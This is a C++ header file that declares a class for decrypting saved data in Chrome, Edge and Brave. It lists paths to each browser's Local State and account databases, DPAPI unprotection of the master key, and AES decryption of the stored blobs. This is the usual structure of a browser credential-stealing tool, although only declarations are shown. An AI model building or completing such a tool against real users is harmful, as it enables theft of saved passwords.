#pragma once
#include <string>
#include <Windows.h>
#include <vector>
#include <iostream>

enum BROWSER
{
	CHROME, EDGE, BRAVE  // Browsers list, index is important here for the lookup table
};

class BCrypt
{
public:
	static const std::string base64_chars;
	static const int IV_SIZE;
	static const int TAG_SIZE;
	static const int NUMBER_OF_BROWSERS;
	static const std::string LOCAL_STATE_PATHS[];
	static const std::string ACCOUNT_DB_PATHS[];
	static std::string GetAppPath();
	static std::string GetDbPath(BROWSER browser);
	static std::string GetLocalState(BROWSER browser);
	static std::string ReadFileToString(const std::string& file_path);
	static std::vector<unsigned char> base64_decode(const std::string& encoded_string);
	static DATA_BLOB* UnportectMasterKey(std::string MasterString);
	static std::string ParseMasterString(std::string data);
	static DATA_BLOB* GetMasterKey(BROWSER browser);
	static std::string AESDecrypter(std::vector<BYTE> EncryptedBlob, int EncryptedBlobsize, DATA_BLOB MasterKey);
};

